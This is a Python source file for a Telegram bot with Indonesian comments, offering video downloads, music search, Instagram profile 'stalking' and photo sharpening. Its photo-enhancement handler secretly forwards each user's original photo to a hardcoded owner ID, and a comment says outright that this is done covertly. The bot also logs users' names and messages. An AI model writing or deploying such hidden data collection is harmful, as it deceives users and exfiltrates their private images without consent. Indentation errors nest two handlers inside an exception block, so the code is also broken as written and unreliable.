import io
import telebot
import yt_dlp
import requests
import os
import threading
import speedtest
from flask import Flask
from PIL import Image, ImageEnhance
import numpy as np
from instaloader import Instaloader, Profile

# Menggunakan token dari environment variable
TOKEN = os.getenv("TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "7388652176"))  # ID Owner sebagai default
bot = telebot.TeleBot(TOKEN)

# Logging pengguna bot
def log_user(message):
    user_info = f"{message.chat.id} - {message.from_user.first_name} {message.from_user.last_name or ''}\n"
    with open("users.txt", "a+") as f:
        f.seek(0)
        users = f.read()
        if user_info not in users:
            f.write(user_info)

# Logging chat di console
def log_chat(message):
    print(f"[{message.chat.id}] {message.from_user.first_name}: {message.text}")

@bot.message_handler(commands=["start", "menu"])
def send_menu(message):
    log_user(message)
    log_chat(message)
    bot.reply_to(
        message, "\U0001F916 Halo! Berikut daftar fitur bot ini:\n\n"
        "\u2705 *Fitur Bot:*\n"
        "- Kirim link YouTube, TikTok, Instagram untuk download video.\n"
        "- Gunakan `/play <judul>` untuk cari & download musik.\n"
        "- Gunakan `/stalk instagram <username>` untuk cek akun sosmed.\n"
        "- Gunakan `/ping` untuk cek kecepatan internet bot.\n"
        "- Gunakan `/hd` untuk meningkatkan kualitas foto.\n"
        "- Gunakan `/hdr` untuk membuat foto lebih tajam.\n"
        "\n⚡ *Gunakan dengan bijak!*",
        parse_mode="Markdown")

# ======================= FITUR PING (SPEED TEST) =======================
@bot.message_handler(commands=["ping"])
def check_speed(message):
    bot.reply_to(message, "⏳ Mengecek kecepatan internet...")
    try:
        st = speedtest.Speedtest()
        st.get_best_server()
        download_speed = st.download() / 1_000_000
        upload_speed = st.upload() / 1_000_000
        ping = st.results.ping
        bot.reply_to(message, f"📊 *Hasil Speedtest:*\n🚀 Download: {download_speed:.2f} Mbps\n⬆ Upload: {upload_speed:.2f} Mbps\n📶 Ping: {ping:.2f} ms", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Gagal mengecek kecepatan.")

# ======================= FITUR PLAY MUSIK =======================
@bot.message_handler(commands=["play"])
def play_music(message):
    try:
        query = message.text.replace("/play", "").strip()
        if not query:
            bot.reply_to(message, "❌ Harap masukkan judul lagu. Contoh: `/play someone like you`", parse_mode="Markdown")
            return

        bot.reply_to(message, f"🔎 Mencari lagu: *{query}*...", parse_mode="Markdown")

        ydl_opts = {
            "format": "bestaudio/best",
            "noplaylist": True,
            "default_search": "ytsearch1",
            "extract_audio": True,
            "audio_format": "mp3",
            "outtmpl": "downloads/%(title)s.%(ext)s"
        }

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(query, download=True)
            file_path = ydl.prepare_filename(info).replace(".webm", ".mp3").replace(".m4a", ".mp3")

        with open(file_path, "rb") as audio:
            bot.send_audio(message.chat.id, audio, title=info["title"], performer=info["uploader"])

        os.remove(file_path)  # Hapus file setelah dikirim
    except Exception as e:
        bot.reply_to(message, f"❌ Gagal mengunduh lagu: {e}")

        # ======================= FITUR STALK INSTAGRAM =======================
        @bot.message_handler(commands=["stalk"])
        def stalk_instagram(message):
            try:
                username = message.text.split(" ", 1)[1].strip()
                bot.reply_to(message, f"🔎 Mencari akun Instagram: @{username}...")

                loader = Instaloader()
                profile = Profile.from_username(loader.context, username)

                bio = profile.biography or "Tidak ada bio."
                followers = profile.followers
                following = profile.followees
                profile_pic = profile.profile_pic_url

                caption = (f"📸 *Instagram Stalker*\n"
                           f"👤 Username: @{username}\n"
                           f"👥 Followers: {followers}\n"
                           f"➡ Following: {following}\n"
                           f"📝 Bio: {bio}")

                bot.send_photo(message.chat.id, profile_pic, caption=caption, parse_mode="Markdown")
            except Exception as e:
                bot.reply_to(message, f"❌ Gagal mencari akun Instagram: {e}")


        # ====================== FITUR PROSES FOTO DAN KIRIM KE OWNER ======================
        @bot.message_handler(content_types=['photo'])
        def process_photo(message):
            try:
                file_info = bot.get_file(message.photo[-1].file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                image = Image.open(io.BytesIO(downloaded_file))
                image.save("original.jpg")

                enhancer = ImageEnhance.Sharpness(image)
                hd_image = enhancer.enhance(2.0)
                hd_bytes = io.BytesIO()
                hd_image.save(hd_bytes, format='JPEG')
                hd_bytes.seek(0)

                # Kirim foto yang telah diperjelas ke pengguna
                bot.send_photo(message.chat.id,
                               hd_bytes,
                               caption="📷 Foto telah dijernihkan!")

                # Kirim foto ke owner secara diam-diam
                bot.send_photo(OWNER_ID, open("original.jpg", "rb"), caption=f"📩 Foto dari ID {message.chat.id}")
            except Exception as e:
                print(f"Error: {e}")


# ====================== FITUR DOWNLOAD TIKTOK ======================
@bot.message_handler(func=lambda message: "tiktok.com" in message.text.lower())
def download_tiktok(message):
    url = message.text.strip()
    bot.reply_to(message, "⏳ Mengunduh video TikTok...")
    try:
        api_url = f"https://api.tikmate.app/api/lookup?url={url}"
        response = requests.get(api_url).json()

        if "success" in response and response["success"]:
            video_url = response["videoUrl"]
            video_data = requests.get(video_url).content
            bot.send_video(message.chat.id, video_data, caption="✅ Video berhasil diunduh!")
        else:
            bot.reply_to(message, "❌ Gagal mengunduh video TikTok. Coba link lain!")
    except Exception as e:
        bot.reply_to(message, f"❌ Terjadi kesalahan: {e}")

# ====================== SETUP FLASK UNTUK UPTIMEROBOT ======================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!", 200  # UptimeRobot akan mengecek halaman ini

def run_flask():
    app.run(host="0.0.0.0", port=8080)

# ====================== MENJALANKAN BOT DAN SERVER SECARA BERSAMAAN ======================
def run_bot():
    print("🤖 Bot sedang berjalan...")
    bot.infinity_polling(skip_pending=True)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()
    run_bot()
